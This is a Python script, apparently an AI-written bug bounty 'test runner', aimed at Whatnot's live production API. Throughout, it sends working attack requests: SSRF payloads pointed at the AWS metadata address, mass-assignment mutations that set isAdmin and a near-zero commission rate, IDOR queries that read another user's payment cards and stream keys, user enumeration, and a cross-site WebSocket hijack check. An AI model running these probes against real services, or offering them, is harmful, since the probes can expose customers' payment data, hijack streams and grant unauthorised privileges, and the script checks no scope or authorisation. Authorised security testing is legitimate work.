#!/usr/bin/env python3
"""
Whatnot Bug Bounty - Automated Test Runner
Run this from YOUR OWN MACHINE (not this sandbox).

Usage:
  pip install requests websocket-client
  python3 test_runner.py                          # unauthenticated tests only
  python3 test_runner.py --email you@x.com --password YourPass1!   # + auth tests
  python3 test_runner.py --email a@x.com --password Pa1! --email2 b@x.com --password2 Pa2!  # + IDOR tests
"""

import requests
import json
import sys
import time
import argparse
from datetime import datetime

# ── Config ─────────────────────────────────────────────────────────────────────
BASE_API      = "https://api.whatnot.com"
SELLER_GQL    = f"{BASE_API}/seller-api/graphql"
MAIN_GQL      = f"{BASE_API}/graphql"
LOGIN_URL     = f"{BASE_API}/api/login"
VERIFY_URL    = f"{BASE_API}/api/verify"
STAGING_GQL   = "https://api.stage.whatnot.com/seller-api/graphql"
S3_BUCKET     = "https://whatnot-public.s3.amazonaws.com"
OAUTH_AUTH    = f"{BASE_API}/seller-api/rest/oauth/authorize"
OAUTH_TOKEN   = f"{BASE_API}/seller-api/rest/oauth/token"

HEADERS = {
    "Content-Type": "application/json",
    "Apollographql-Client-Name": "web",
    "Apollographql-Client-Version": "20230710-1529",
    "X-Whatnot-App": "whatnot-web",
    "Origin": "https://www.whatnot.com",
    "Referer": "https://www.whatnot.com/",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36"
}

results = []

def log(status, title, detail="", evidence=""):
    icon = "✅ VULNERABLE" if status == "VULN" else ("⚠️  POSSIBLE" if status == "POSSIBLE" else "🔒 SAFE")
    print(f"\n{'='*70}")
    print(f"{icon}: {title}")
    if detail:  print(f"Detail  : {detail}")
    if evidence: print(f"Evidence: {evidence[:300]}")
    results.append({"status": status, "title": title, "detail": detail, "evidence": evidence})

def gql(token, query, variables=None, endpoint=SELLER_GQL):
    h = {**HEADERS, "Authorization": f"Bearer {token}"} if token else HEADERS
    body = {"query": query}
    if variables:
        body["variables"] = variables
    try:
        r = requests.post(endpoint, headers=h, json=body, timeout=15)
        return r
    except Exception as e:
        return None

# ── TEST 1: S3 Bucket Public Exposure ──────────────────────────────────────────
def test_s3_bucket():
    print("\n[1/13] Testing S3 bucket public exposure...")
    files = [
        "/regulatory_notices/Candidate+Privacy+Notice+(GDPR)+(DRAFT+8.11)+(ACP).docx.pdf",
        "/Whatnot+gst506+%5BUsers+Name%5D.pdf",
    ]
    for f in files:
        r = requests.head(f"{S3_BUCKET}{f}", timeout=10)
        if r.status_code == 200:
            log("VULN", "S3 Bucket: Internal document publicly accessible",
                f"File: {f}",
                f"HTTP 200, Content-Type: {r.headers.get('Content-Type','?')}, Size: {r.headers.get('Content-Length','?')} bytes")
        else:
            log("SAFE", f"S3 file not accessible", f"{f} -> HTTP {r.status_code}")

    # Test bucket listing
    r = requests.get(f"{S3_BUCKET}/?list-type=2&max-keys=100", timeout=10)
    if r.status_code == 200 and "<Key>" in r.text:
        keys = [l.strip() for l in r.text.split('\n') if '<Key>' in l]
        log("VULN", "S3 Bucket: Directory listing ENABLED",
            f"Found {len(keys)} keys",
            "\n".join(keys[:10]))
    else:
        log("SAFE", "S3 bucket listing disabled", f"HTTP {r.status_code}")

# ── TEST 2: User Enumeration ───────────────────────────────────────────────────
def test_user_enumeration(real_email):
    print("\n[2/13] Testing user enumeration via login endpoint...")
    fake_email = f"zzznobody_fake_xyz_{int(time.time())}@nonexistent-domain-whatnot.xyz"

    def do_login(email):
        start = time.time()
        r = requests.post(LOGIN_URL, headers=HEADERS, json={
            "email": email, "password": "WrongPass_XYZ_999!",
            "device_id": "test-device-001", "app_type": "web"
        }, timeout=15)
        elapsed = time.time() - start
        return r.status_code, r.text[:200], elapsed

    code1, body1, t1 = do_login(fake_email)
    code2, body2, t2 = do_login(real_email)

    if code1 != code2:
        log("VULN", "User Enumeration: Different HTTP status codes",
            f"Non-existent email: HTTP {code1} | Real email: HTTP {code2}",
            f"Fake: {body1}\nReal: {body2}")
    elif body1 != body2:
        log("VULN", "User Enumeration: Different response bodies",
            f"Timing: fake={t1:.3f}s, real={t2:.3f}s",
            f"Fake body: {body1}\nReal body: {body2}")
    elif abs(t1 - t2) > 0.5:
        log("POSSIBLE", "User Enumeration: Timing difference detected",
            f"Fake: {t1:.3f}s | Real: {t2:.3f}s | Diff: {abs(t1-t2):.3f}s",
            "Run multiple times to confirm consistent timing difference")
    else:
        log("SAFE", "User enumeration not detected",
            f"HTTP {code1}=={code2}, bodies identical, timing similar")

# ── TEST 3: Staging API Exposure ──────────────────────────────────────────────
def test_staging():
    print("\n[3/13] Testing staging API public accessibility...")
    r = requests.post(STAGING_GQL, headers=HEADERS,
                      json={"query": "{ __typename }"}, timeout=15)
    if r.status_code in (200, 401):
        log("VULN", "Staging API publicly reachable from internet",
            f"HTTP {r.status_code} — staging endpoint should be internal-only",
            r.text[:300])
    else:
        log("SAFE", "Staging API not publicly reachable", f"HTTP {r.status_code}")

    # Test for verbose errors on staging
    r2 = requests.post(STAGING_GQL, headers=HEADERS,
                       json={"query": "{ invalidFieldXYZ123 }"}, timeout=15)
    if r2.status_code == 200 and any(x in r2.text.lower() for x in ["stacktrace","exception","elixir","phoenix","ecto","file:"]):
        log("VULN", "Staging API leaks stack traces / internal error info",
            "Response contains internal framework details",
            r2.text[:400])

# ── TEST 4: GraphQL Introspection (Production) ────────────────────────────────
def test_introspection(token=None):
    print("\n[4/13] Testing GraphQL introspection on production...")
    query = "{ __schema { types { name } } }"

    # Unauthenticated
    r = gql(None, query)
    if r and r.status_code == 200 and "__schema" in r.text and "errors" not in r.text:
        log("VULN", "GraphQL introspection enabled WITHOUT authentication",
            "Full schema accessible to unauthenticated users",
            r.text[:400])
        return

    # Authenticated
    if token:
        r = gql(token, query)
        if r and r.status_code == 200 and "__schema" in r.text and '"errors"' not in r.text:
            log("VULN", "GraphQL introspection enabled (authenticated)",
                "Full schema accessible to any logged-in user",
                r.text[:400])
            return

        # Check for field suggestions even if introspection blocked
        r2 = gql(token, "{ invalidFieldXYZ123 { id } }")
        if r2 and "Did you mean" in r2.text:
            log("VULN", "GraphQL field suggestions leak schema despite introspection disabled",
                "Error message reveals valid field names",
                r2.text[:300])
            return

    log("SAFE", "GraphQL introspection disabled (or untested without token)")

# ── TEST 5: GraphQL Batching (Rate Limit Bypass) ──────────────────────────────
def test_batching(token=None):
    print("\n[5/13] Testing GraphQL batching support...")
    if not token:
        print("  Skipped — requires auth token (use --email / --password)")
        return

    batch = [{"query": "{ __typename }"} for _ in range(10)]
    h = {**HEADERS, "Authorization": f"Bearer {token}"}
    r = requests.post(SELLER_GQL, headers=h, json=batch, timeout=15)

    if r.status_code == 200:
        try:
            data = r.json()
            if isinstance(data, list) and len(data) == 10:
                log("VULN", "GraphQL batching ENABLED — rate limit bypass possible",
                    f"Sent 10 operations in 1 HTTP request, got {len(data)} results back",
                    r.text[:300])
            else:
                log("POSSIBLE", "Batching accepted but unexpected response shape",
                    str(data)[:200])
        except:
            log("POSSIBLE", "Batching returned 200 but non-JSON response", r.text[:200])
    else:
        log("SAFE", "GraphQL batching rejected", f"HTTP {r.status_code}: {r.text[:150]}")

# ── TEST 6: IDOR — Payment Data ───────────────────────────────────────────────
def test_idor_payment(token_a, token_b):
    print("\n[6/13] Testing IDOR on payment data...")
    # Get Account B's user ID
    r = gql(token_b, "{ me { id username } }")
    if not r or r.status_code != 200:
        print("  Could not get Account B's ID — skipping")
        return

    b_id = r.json().get("data", {}).get("me", {}).get("id")
    if not b_id:
        print(f"  Could not parse Account B ID from: {r.text[:200]}")
        return
    print(f"  Account B ID: {b_id}")

    # Try to fetch B's payment data as Account A
    queries = [
        ("user(id) direct", f'{{ user(id: "{b_id}") {{ paymentCards {{ cardType cardReference billingAddress {{ line1 zip }} }} walletAddresses {{ address currency }} }} }}'),
        ("alias bypass",    f'{{ me {{ id }} victim: user(id: "{b_id}") {{ paymentCards {{ cardType cardReference }} }} }}'),
    ]
    for name, q in queries:
        r = gql(token_a, q)
        if not r:
            continue
        d = r.json()
        cards = d.get("data", {}).get("user", {}) or d.get("data", {}).get("victim", {})
        if cards and cards.get("paymentCards"):
            log("VULN", f"IDOR: Payment card data accessible cross-user ({name})",
                f"Account A (attacker) read Account B's payment cards",
                json.dumps(cards)[:400])
        else:
            log("SAFE", f"IDOR payment ({name}) — data not returned", r.text[:200])

# ── TEST 7: IDOR — Stream Token ───────────────────────────────────────────────
def test_stream_token(token_a, token_b):
    print("\n[7/13] Testing stream token IDOR...")
    # Get any active stream ID
    r = gql(token_a, '{ livestreams(status: "playing", first: 3) { edges { node { id title user { id } } } } }')
    if not r or r.status_code != 200:
        print("  Could not fetch active streams — skipping")
        return

    edges = r.json().get("data", {}).get("livestreams", {}).get("edges", [])
    if not edges:
        print("  No active streams found right now — try when a stream is live")
        return

    b_id_from_me = gql(token_b, "{ me { id } }").json().get("data", {}).get("me", {}).get("id")

    for edge in edges:
        node = edge.get("node", {})
        stream_id = node.get("id")
        stream_owner = node.get("user", {}).get("id")

        if stream_owner == b_id_from_me:
            continue  # skip your own stream

        r2 = gql(token_a, f'{{ live(id: "{stream_id}") {{ id streamToken status user {{ id username }} }} }}')
        if r2:
            data = r2.json().get("data", {}).get("live", {})
            if data and data.get("streamToken"):
                log("VULN", "IDOR: Stream token returned for another seller's livestream",
                    f"Stream {stream_id} owned by {stream_owner} — token leaked to different user",
                    json.dumps(data)[:400])
                return
            else:
                log("SAFE", f"Stream token not returned for stream {stream_id}", r2.text[:200])

# ── TEST 8: WebSocket Endpoint Discovery ─────────────────────────────────────
def test_websocket_endpoints():
    print("\n[8/13] Testing WebSocket endpoint discovery...")
    paths = [
        "/socket/websocket",
        "/graphql/websocket",
        "/subscriptions",
        "/live/websocket",
        "/ws",
        "/cable",
    ]
    for path in paths:
        url = f"https://api.whatnot.com{path}"
        try:
            r = requests.get(url, headers={
                **HEADERS,
                "Upgrade": "websocket",
                "Connection": "Upgrade",
                "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                "Sec-WebSocket-Version": "13",
            }, timeout=8)
            if r.status_code == 101:
                log("VULN", f"WebSocket endpoint found: {path}",
                    "101 Switching Protocols — test for auth bypass next",
                    str(r.headers))
            elif r.status_code in (200, 400, 401, 403):
                log("POSSIBLE", f"WebSocket path responds at {path}",
                    f"HTTP {r.status_code} — may be active endpoint",
                    r.text[:150])
        except Exception as e:
            pass

# ── TEST 9: CSWSH — Origin Header Validation ─────────────────────────────────
def test_cswsh():
    print("\n[9/13] Testing Cross-Site WebSocket Hijacking (Origin validation)...")
    paths = ["/socket/websocket", "/graphql/websocket", "/subscriptions"]
    for path in paths:
        url = f"https://api.whatnot.com{path}"
        try:
            r = requests.get(url, headers={
                "User-Agent": HEADERS["User-Agent"],
                "Origin": "https://evil-attacker.com",
                "Upgrade": "websocket",
                "Connection": "Upgrade",
                "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                "Sec-WebSocket-Version": "13",
            }, timeout=8)
            if r.status_code == 101:
                log("VULN", f"CSWSH: WebSocket accepts connections from evil origin at {path}",
                    "Origin: https://evil-attacker.com was NOT rejected",
                    str(r.headers))
            elif r.status_code == 403:
                log("SAFE", f"CSWSH: Origin validation working at {path}",
                    f"HTTP 403 for evil origin")
        except Exception:
            pass

# ── TEST 10: Mass Assignment ──────────────────────────────────────────────────
def test_mass_assignment(token):
    print("\n[10/13] Testing mass assignment via GraphQL mutations...")
    if not token:
        print("  Skipped — requires auth token")
        return

    payloads = [
        ("updateUser isAdmin", '{ updateUser(input: { isAdmin: true, isTrustedSeller: true, commissionRate: 0.001 }) { user { id isAdmin isTrustedSeller commissionRate } } }'),
        ("updateProfile sellerApproved", '{ updateProfile(input: { sellerApproved: true, commissionRate: 0.001 }) { profile { sellerApproved commissionRate } } }'),
    ]
    for name, q in payloads:
        r = gql(token, f"mutation {q}")
        if not r:
            continue
        if "isAdmin" in r.text and "true" in r.text and '"errors"' not in r.text:
            log("VULN", f"Mass assignment: {name} — privileged field accepted",
                "Mutation succeeded with restricted fields",
                r.text[:400])
        elif "commissionRate" in r.text and '"errors"' not in r.text:
            d = r.json().get("data", {})
            flat = json.dumps(d)
            if "0.001" in flat:
                log("VULN", f"Mass assignment: commissionRate set to 0.001 via {name}",
                    "Fee bypass confirmed",
                    flat[:300])
            else:
                log("POSSIBLE", f"Mass assignment: mutation ran but check response for {name}", flat[:200])
        else:
            log("SAFE", f"Mass assignment blocked for {name}", r.text[:150])

# ── TEST 11: SSRF via Image URL ───────────────────────────────────────────────
def test_ssrf(token, callback_url=None):
    print("\n[11/13] Testing SSRF via product image URL...")
    if not token:
        print("  Skipped — requires auth token")
        return
    if not callback_url:
        print("  Note: No --ssrf-callback set. Using a safe public IP to detect fetch.")
        print("  For full SSRF test, set --ssrf-callback to your interactsh/burp URL")
        # Use a known-safe external URL that logs requests
        callback_url = "https://ifconfig.me/ip"

    # Try AWS metadata
    payloads = [
        ("AWS metadata",          "http://169.254.169.254/latest/meta-data/"),
        ("AWS metadata (decimal)", "http://2852039166/latest/meta-data/"),
        ("localhost:4000",         "http://localhost:4000/"),
        ("callback",               callback_url),
    ]
    for name, url in payloads:
        q = f'''mutation {{
          createProduct(input: {{
            title: "SSRF Test {int(time.time())}",
            description: "test",
            price: 1.00,
            images: [{{ url: "{url}" }}]
          }}) {{
            product {{ id images {{ url }} }}
          }}
        }}'''
        r = gql(token, q)
        if not r:
            continue
        # If the response body contains content from the SSRF target, it worked
        if any(x in r.text for x in ["ami-id", "instance-id", "iam", "169.254", "local-ipv4"]):
            log("VULN", f"SSRF: AWS metadata service reached via image URL ({name})",
                "Server-side fetch returned AWS metadata content",
                r.text[:500])
        elif "images" in r.text and callback_url in r.text:
            log("POSSIBLE", f"SSRF: Product created with {name} URL — check callback server for DNS/HTTP hit",
                "Monitor your interactsh/burp collaborator for an inbound request",
                r.text[:300])
        else:
            log("SAFE", f"SSRF ({name}): No metadata content returned", r.text[:150])

# ── TEST 12: OAuth PKCE Check ─────────────────────────────────────────────────
def test_pkce():
    print("\n[12/13] Testing OAuth PKCE enforcement...")
    # Test that the auth server rejects requests without code_challenge
    # We can't complete the full flow without a registered app,
    # but we can confirm the server doesn't require it in the initial request
    r = requests.get(
        f"{OAUTH_AUTH}",
        params={
            "client_id": "test_client_id_probe",
            "redirect_uri": "https://example.com/callback",
            "response_type": "code",
            "scope": "read:inventory",
            "state": "teststate123"
            # Deliberately NO code_challenge or code_challenge_method
        },
        headers=HEADERS,
        allow_redirects=False,
        timeout=15
    )
    if r.status_code in (302, 301):
        location = r.headers.get("Location", "")
        if "error=invalid_request" in location.lower() or "code_challenge" in location.lower():
            log("SAFE", "OAuth PKCE: Server requires code_challenge for authorization requests",
                "Redirect contained PKCE error — good",
                location[:200])
        elif "whatnot.com" in location:
            log("VULN", "OAuth PKCE: Server proceeds WITHOUT code_challenge",
                "Authorization request accepted without PKCE — vulnerable to code interception",
                f"Redirected to: {location[:200]}")
        else:
            log("POSSIBLE", "OAuth PKCE: Unexpected redirect", location[:200])
    elif r.status_code == 400:
        body = r.text[:200]
        if "code_challenge" in body.lower():
            log("SAFE", "OAuth PKCE enforced — 400 without code_challenge", body)
        else:
            log("POSSIBLE", "OAuth PKCE: 400 response — check if due to invalid client_id or missing PKCE",
                body)
    else:
        log("POSSIBLE", f"OAuth PKCE: HTTP {r.status_code} — needs real client_id to confirm",
            r.text[:200])

# ── TEST 13: Multicast RTMP Key IDOR ─────────────────────────────────────────
def test_rtmp_idor(token_a, token_b):
    print("\n[13/13] Testing multicast RTMP key IDOR...")
    b_id_r = gql(token_b, "{ me { id } }")
    if not b_id_r:
        print("  Skipped — could not get Account B ID")
        return
    b_id = b_id_r.json().get("data", {}).get("me", {}).get("id")

    queries = [
        ("user direct",  f'{{ user(id: "{b_id}") {{ multicastDestinations {{ platform rtmpUrl streamKey }} }} }}'),
        ("alias",        f'{{ me {{ id }} victim: user(id: "{b_id}") {{ multicastDestinations {{ platform rtmpUrl streamKey }} }} }}'),
    ]
    for name, q in queries:
        r = gql(token_a, q)
        if not r:
            continue
        data = r.json()
        flat = json.dumps(data)
        if "streamKey" in flat and "null" not in flat and '"errors"' not in flat:
            log("VULN", f"IDOR: RTMP/multicast stream key returned for other user ({name})",
                "Attacker can hijack victim's YouTube/Twitch stream",
                flat[:400])
        else:
            log("SAFE", f"RTMP key IDOR ({name}) — not returned", flat[:150])

# ── Main ───────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="Whatnot Bug Bounty Test Runner")
    parser.add_argument("--email",     help="Account A (attacker) email")
    parser.add_argument("--password",  help="Account A password")
    parser.add_argument("--email2",    help="Account B (victim) email (for IDOR tests)")
    parser.add_argument("--password2", help="Account B password")
    parser.add_argument("--ssrf-callback", help="Your interactsh/Burp Collaborator URL for SSRF detection")
    args = parser.parse_args()

    print("=" * 70)
    print("  Whatnot Bug Bounty — Automated Test Runner")
    print(f"  {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print("=" * 70)

    token_a = token_b = None

    # Authenticate Account A
    if args.email and args.password:
        print(f"\n[AUTH] Logging in as Account A ({args.email})...")
        r = requests.post(LOGIN_URL, headers=HEADERS, json={
            "email": args.email, "password": args.password,
            "device_id": "test-device-001", "app_type": "web"
        }, timeout=15)
        if r.status_code == 200:
            token_a = r.json().get("access_token") or r.json().get("token")
            print(f"  Token A: {str(token_a)[:40]}..." if token_a else f"  Login response: {r.text[:200]}")
        else:
            print(f"  Login failed: HTTP {r.status_code}: {r.text[:200]}")

    # Authenticate Account B
    if args.email2 and args.password2:
        print(f"\n[AUTH] Logging in as Account B ({args.email2})...")
        r = requests.post(LOGIN_URL, headers=HEADERS, json={
            "email": args.email2, "password": args.password2,
            "device_id": "test-device-002", "app_type": "web"
        }, timeout=15)
        if r.status_code == 200:
            token_b = r.json().get("access_token") or r.json().get("token")
            print(f"  Token B: {str(token_b)[:40]}..." if token_b else f"  Login response: {r.text[:200]}")
        else:
            print(f"  Login failed: HTTP {r.status_code}: {r.text[:200]}")

    # Run tests
    test_s3_bucket()
    test_user_enumeration(args.email or "test@gmail.com")
    test_staging()
    test_introspection(token_a)
    test_batching(token_a)
    test_websocket_endpoints()
    test_cswsh()
    test_pkce()
    if token_a:
        test_mass_assignment(token_a)
        test_ssrf(token_a, args.ssrf_callback)
    if token_a and token_b:
        test_idor_payment(token_a, token_b)
        test_stream_token(token_a, token_b)
        test_rtmp_idor(token_a, token_b)

    # Summary
    print("\n" + "=" * 70)
    print("  RESULTS SUMMARY")
    print("=" * 70)
    vulns    = [r for r in results if r["status"] == "VULN"]
    possible = [r for r in results if r["status"] == "POSSIBLE"]
    safe     = [r for r in results if r["status"] == "SAFE"]
    print(f"  ✅ VULNERABLE : {len(vulns)}")
    print(f"  ⚠️  POSSIBLE  : {len(possible)}")
    print(f"  🔒 SAFE      : {len(safe)}")
    print()
    if vulns:
        print("  === SUBMIT THESE TO HACKERONE ===")
        for v in vulns:
            print(f"  → {v['title']}")
            print(f"    {v['detail']}")

    # Save full report
    report_file = f"test_results_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
    with open(report_file, "w") as f:
        json.dump(results, f, indent=2)
    print(f"\n  Full results saved to: {report_file}")

if __name__ == "__main__":
    main()
